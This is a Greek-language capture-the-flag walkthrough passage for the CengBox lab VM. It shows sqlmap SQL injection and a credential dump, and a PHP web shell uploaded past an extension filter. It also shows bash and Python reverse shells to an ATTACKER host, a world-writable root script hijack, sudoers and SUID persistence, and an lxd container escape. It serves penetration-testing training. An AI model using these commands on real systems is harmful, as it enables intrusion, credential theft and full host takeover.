**Σημειώστε: το μήνυμα είναι ΤΟ ΙΔΙΟ για λάθος username και λάθος password.** **Αυτό είναι καλή
πρακτική** — και **ο λόγος που χρειάζεστε `sqlmap` αντί να μαντεύετε.**

### 5. Αφήστε το `sqlmap` να βρει το injection

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

```text
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[17:22:41] [INFO] testing connection to the target URL
[17:22:41] [INFO] searching for forms
[17:22:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:22:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:23:12] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[17:23:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:23:19] [INFO] target URL appears to be UNION injectable with 3 columns
[17:23:19] [CRITICAL] parameter 'username' is vulnerable. Do you want to keep testing the others? [y/N] N
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 1=1-- -&password=x

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND SLEEP(5)-- -&password=x

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x71706a7871,0x616263,0x71626b6271)-- -&password=x
---
[17:23:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04
back-end DBMS: MySQL >= 5.0.12
```

**`with a total of 47 HTTP(s) requests`** — **47 αιτήσεις** για να βρει **τρεις** τεχνικές.
**Αυτό είναι το κόστος του αυτοματισμού**, και **ο λόγος που το `--batch` + `--throttle` έχει
σημασία σε πραγματικό έργο.**

### 6. Άδειασμα της βάσης

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --data="username=a&password=b" \
       -p username --batch --dbs
```

```text
available databases [2]:
[*] cengbox
[*] information_schema
```

```bash
sqlmap -u "…" --data="username=a&password=b" -p username --batch -D cengbox --tables
```

```text
Database: cengbox
[3 tables]
+---------+
| uploads |
| users   |
| config  |
+---------+
```

```bash
sqlmap -u "…" --data="username=a&password=b" -p username --batch -D cengbox -T users --dump
```

```text
Database: cengbox
Table: users
[1 entry]
+----+-------------+-----------------+
| id | username    | password        |
+----+-------------+-----------------+
| 1  | masteradmin | C3ng0v3R00T1!   |
+----+-------------+-----------------+
```

| Flag | Ρόλος |
| --- | --- |
| **`--dbs`** | **Λίστα βάσεων** |
| **`-D NAME --tables`** | **Λίστα πινάκων** στη βάση NAME |
| **`-T NAME --dump`** | **Εκτύπωση γραμμών** του πίνακα NAME |
| **`-p username`** | **Καρφιτσώνει την παράμετρο** που ήδη αποδείξατε ευάλωτη — **το sqlmap σταματά να ξαναδοκιμάζει όλα τα άλλα**. **Μεγάλη εξοικονόμηση χρόνου** |
| **`--data`** | **Το POST body** |

**`information_schema`** είναι η **μετα-βάση της MySQL** — **πάντα υπάρχει, δεν είναι εύρημα**.

**Διαβάστε το ΣΧΗΜΑ, όχι μόνο τις γραμμές.** **`password` σε στήλη `varchar(64)` ΧΩΡΙΣ
`$2y$` ή `$6$` σημαίνει ότι ο κωδικός αποθηκεύεται σε ΚΑΘΑΡΟ ΚΕΙΜΕΝΟ** — **εύρημα
επιπέδου αναφοράς**.

**Και σημειώστε: ο πίνακας `uploads` κρατά ήδη δύο αρχεία `.ceng`.** **Αυτή η επέκταση είναι η
υπόδειξη για την επόμενη φάση.**

**Σύνδεση στο `/masteradmin/login.php` ως `masteradmin` / `C3ng0v3R00T1!`.**

### 7. Το φίλτρο upload `.ceng`

**Το `upload.php` απορρίπτει οτιδήποτε δεν είναι `.ceng`.** **Κατανοήστε το φίλτρο ΠΡΙΝ το
παρακάμψετε:** **ελέγχει τη ΣΥΜΒΟΛΟΣΕΙΡΑ επέκτασης**. **Και αυτή η εφαρμογή ΧΑΡΤΟΓΡΑΦΙΖΕΙ το
`.ceng` στον PHP handler** — **που είναι αυτό που μετατρέπει έναν κανόνα «μόνο έγγραφα» σε
remote code execution.**

```bash
cat > shell.ceng <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -s -b cookies.txt -F "file=@shell.ceng" http://TARGET/masteradmin/upload.php
curl -s "http://TARGET/uploads/shell.ceng?cmd=id"
```

```text
Upload successful
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

| Flag | Ρόλος |
| --- | --- |
| **`-F "file=@shell.ceng"`** | **POST ως `multipart/form-data`** με πεδίο **`file`**· το **`@`** σημαίνει **«διάβασε αυτή τη διαδρομή»** |
| **`-b cookies.txt`** | **Επανάληψη της πιστοποιημένης session σας** — **χωρίς αυτό παίρνετε το `302` που είδατε στο βήμα 3** |

**`uid=33(www-data)`** είναι **η αναμενόμενη προσγείωση**: **μη προνομιούχος, αλλά ΠΑΝΩ στον
εξυπηρετητή.**

### 8. Reverse shell και αναβάθμιση TTY

```bash
nc -lvnp 4444                                     # Kali, πρώτα
curl -s "http://TARGET/uploads/shell.ceng?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.106.
www-data@cengbox:/var/www/html$
```

**Το URL-encoding ΔΕΝ είναι προαιρετικό εδώ.** **`&`, `>` και κενά** είναι **όλα σημασιολογικά
ή παράνομα** σε ένα query string, άρα **αν σταλούν ωμά το payload ΚΟΒΕΤΑΙ στο πρώτο `&`** και
**δεν γίνεται τίποτα** — **που μοιάζει με σπασμένο κέλυφος**.

**Παράγετε την κωδικοποίηση, μην πληκτρολογείτε `%26` με το χέρι.**

**Η `urllib.parse.quote()`** κωδικοποιεί **κάθε byte εκτός του `[A-Za-z0-9_.-~]`**:

```text
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
→ bash%20-i%20%3E%26%20/dev/tcp/192.168.56.10/4444%200%3E%261
```

**Μετά αναβαθμίστε:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Χωρίς TTY, η `su` αποτυγχάνει με `standard input must be a tty`, και το `Ctrl+C` ΣΚΟΤΩΝΕΙ τον
listener σας.**

**Αριθμήστε τι είναι διαθέσιμο ΠΡΙΝ δεσμευτείτε σε payload:**

```bash
uname -a; hostname; cat /etc/os-release; pwd
for b in bash sh python python3 perl nc curl wget gcc socat; do command -v $b; done
```

```text
Linux cengbox 5.4.0-42-generic #46~18.04.1-Ubuntu SMP Fri Jul 10 07:21:24 UTC 2020 x86_64
/bin/bash /bin/sh /usr/bin/python /usr/bin/python3 /usr/bin/perl /usr/bin/curl /usr/bin/wget /usr/bin/gcc
```

**Αυτό το μηχάνημα ΔΕΝ έχει `nc`** — **γι' αυτό το `/dev/tcp` του bash είναι η σωστή επιλογή.**

**Προσέξτε: υπάρχουν ΚΑΙ `/usr/bin/python` ΚΑΙ `/usr/bin/python3`.** **Το `/usr/bin/python`
είναι Python 2** — **και αυτό έχει σημασία για το payload του βήματος 12.**

### 9. Πλαγινή κίνηση — επανάχρηση διαπιστευτηρίων

```bash
cat /etc/passwd | grep -E ':(1000|1001):'
su cengover
id
cat /home/cengover/user.txt
```

```text
cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
```
```text
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),110(lxd)
```
```text
d41d8cd98f00b204e9800998ecf8427e
```

**Διαβάστε το `grep -E ':(1000|1001):'` ως «βρες γραμμές των οποίων τα πεδία UID/GID είναι
ΠΡΑΓΜΑΤΙΚΟΙ χρήστες»** — **οι λογαριασμοί συστήματος ζουν κάτω από το 1000.**

**Ο κωδικός της ΒΑΣΗΣ δουλεύει ΚΑΙ για τον λογαριασμό του ΣΥΣΤΗΜΑΤΟΣ**: **επανάχρηση
διαπιστευτηρίων μεταξύ συστημάτων.**

**Μετά διαβάστε την έξοδο του `id` προσεκτικά — `groups=…,110(lxd)`.**

**Αυτή η ομάδα είναι ΙΣΟΔΥΝΑΜΗ με root**, και είναι **η εναλλακτική σας διαδρομή αναβάθμισης**.

### 10. Ανάβαση — το cron δεν δείχνει τίποτα

```bash
crontab -l; cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/
```

```text
no crontab for cengover
```
```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

**Όλα stock, τίποτα προσαρμοσμένο.**

**Τα πεδία του `/etc/crontab` είναι `λεπτό ώρα dom mon dow ΧΡΗΣΤΗΣ εντολή`** — **σημειώστε τη
στήλη *χρήστης*, την οποία τα ανά-χρήστη crontabs ΔΕΝ έχουν**.

**Αυτή η στήλη είναι που κάνει μια εργασία cron συστήματος να τρέχει ως root.**

**Τίποτα εδώ δεν είναι εκμεταλλεύσιμο.**

### 11. `pspy` — δείτε ό,τι το `ps` δεν μπορεί

```bash
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

```text
pspy - version: v1.2.1 - Commit ID: 071d671

2024/05/04 19:02:06 CMD: UID=1000   PID=1839   | ./pspy64
2024/05/04 19:02:11 CMD: UID=0     PID=1842   | /usr/bin/python /opt/md5check.py
2024/05/04 19:02:16 CMD: UID=0     PID=1845   | /usr/bin/python /opt/md5check.py
2024/05/04 19:02:21 CMD: UID=0     PID=1848   | /usr/bin/python /opt/md5check.py
```

**Οι επαναλαμβανόμενοι χρόνοι ΑΝΑ 5 ΔΕΥΤΕΡΟΛΕΠΤΑ αποδεικνύουν ότι είναι χρονοπρογραμματισμένη
εργασία — και ΔΕΝ είναι στο cron**, άρα είναι **systemd timer** ή **βρόχος `while true; sleep 5`**.

```bash
ls -l /opt/md5check.py
cat /opt/md5check.py
```

```text
-rwxrwxrwx 1 root root 612 Oct 19 15:40 /opt/md5check.py
```
```python
#!/usr/bin/python
# Verify that /etc/passwd has not been tampered with.
# Compares the current md5 against the stored baseline and restores it if changed.
import hashlib, shutil
h = hashlib.md5(open('/etc/passwd','rb').read()).hexdigest()
if h != open('/opt/passwd.md5').read().strip():
    shutil.copy('/opt/passwd.bak','/etc/passwd')
```

**`-rwxrwxrwx` — mode `777`.**

**Ένα σενάριο ιδιοκτησίας root, εκτελούμενο ΑΠΟ ROOT κάθε πέντε δευτερόλεπτα, που ΟΠΟΙΟΣΔΗΠΟΤΕ
χρήστης στο μηχάνημα μπορεί να αντικαταστήσει.**

**Αυτή είναι ΟΛΟΚΛΗΡΗ η αναβάθμιση προνομίων.**

### 12. Τρία payloads — και ποιο να διαλέξετε

**Α — root reverse shell (πιο άμεσο):**

```bash
cp /opt/md5check.py /tmp/md5check.py.bak        # ΠΑΝΤΑ κρατήστε αντίγραφο πρώτα
cat > /opt/md5check.py <<'EOF'
import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
# περιμένετε πέντε δευτερόλεπτα
```

```text
Ncat: Connection from 192.168.56.106.
root@cengbox:/opt#
```

**Το `os.dup2(fd, 0/1/2)` στρέφει **stdin, stdout και stderr** στο socket**, μετά το
`subprocess.call` **εκτελεί bash, που τα κληρονομεί**.

**Κάθε reverse shell σε κάθε γλώσσα είναι αυτά τα τρία βήματα:**
**σύνδεση → ανακατεύθυνση stdio → εκτέλεση κελύφους.**

**Σημειώστε: το `/usr/bin/python` εδώ είναι PYTHON 2**, άρα αυτό το payload **εσκεμμένα
χρησιμοποιεί μόνο σύνταξη έγκυρη και στην 2 και στην 3**.

**Β — χορήγηση passwordless sudo (επιζεί αποσύνδεσης, δεν χρειάζεται egress):**

```bash
echo 'cengover ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/cengover && chmod 440 /etc/sudoers.d/cengover
sudo -i
```

**Προτιμήστε ένα `/etc/sudoers.d/` drop-in από το να προσθέσετε στο `/etc/sudoers`:** ένα
συντακτικό σφάλμα στο `/etc/sudoers` **κλειδώνει ΟΛΟΥΣ έξω από το sudo** (γι' αυτό υπάρχει το
**`visudo`** — **επικυρώνει πριν αποθηκεύσει**), ενώ ένα κακό drop-in **επηρεάζει μόνο τον
εαυτό του**. **Το `chmod 440` είναι υποχρεωτικό** — **το sudo αγνοεί αρχεία με χαλαρά
δικαιώματα.**

**Γ — SUID root bash (εμμονή):**

```bash
cp /bin/bash /tmp/rb && chown root:root /tmp/rb && chmod 4755 /tmp/rb && /tmp/rb -p
id
```

```text
uid=1000(cengover) gid=1000(cengover) euid=0(root) egid=0(root) groups=1000(cengover),110(lxd)
```

**Διαβάστε το `id` ως *SUID αναβάθμιση, όχι σύνδεση*:** **το πραγματικό UID παραμένει
`1000(cengover)`, το ΕΝΕΡΓΟ γίνεται `0`**, και **οι έλεγχοι δικαιωμάτων χρησιμοποιούν το
ενεργό**.

```bash
cat /root/root.txt
cp /tmp/md5check.py.bak /opt/md5check.py && ls -l /opt/md5check.py    # ΕΠΑΝΑΦΟΡΑ μετά
```

### 13. Εναλλακτικό root — η ομάδα `lxd`

```bash
# Στον Kali:
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine
python3 -m http.server 8000

# Στον στόχο:
wget http://ATTACKER:8000/alpine.tar.gz
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

```text
uid=0(root) gid=0(root)
```

**Πώς λειτουργεί:** το **`lxc init … -c security.privileged=true`** δημιουργεί ένα
**προνομιούχο container**. **`-c security.privileged=true`** σημαίνει ότι το container **τρέχει
χωρίς user namespace remapping** — άρα **το root μέσα στο container ΕΙΝΑΙ root έξω**.

**`lxc config device add … disk source=/ path=/mnt/root recursive=true`** **προσαρτά ΟΛΟΚΛΗΡΟ
το ριζικό σύστημα αρχείων του host** μέσα στο container. **Μετά, από μέσα, διαβάζετε το
`/mnt/root/root/etc/shadow`** — **ή γράφετε SSH keys.**

**Αυτή είναι η διαδρομή που χρησιμοποιεί η ομάδα `lxd`,** και είναι **ο λόγος που η `lxd` είναι
ισοδύναμη με root**.

**Προσοχή:** το **`./build-alpine`** κατεβάζει από το internet — **σε περιβάλλον χωρίς egress,
χρειάζεστε την εικόνα έτοιμη**.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 8 — Empire: Breakout](<08-empire-breakout.md>) · επόμενο: [Μηχάνημα 10 — PwnLab: init](<10-pwnlab-init.md>) · πλήρες walkthrough: [`labs/3-018-cengbox-1`](../../labs/3-018-cengbox-1/README.md)_
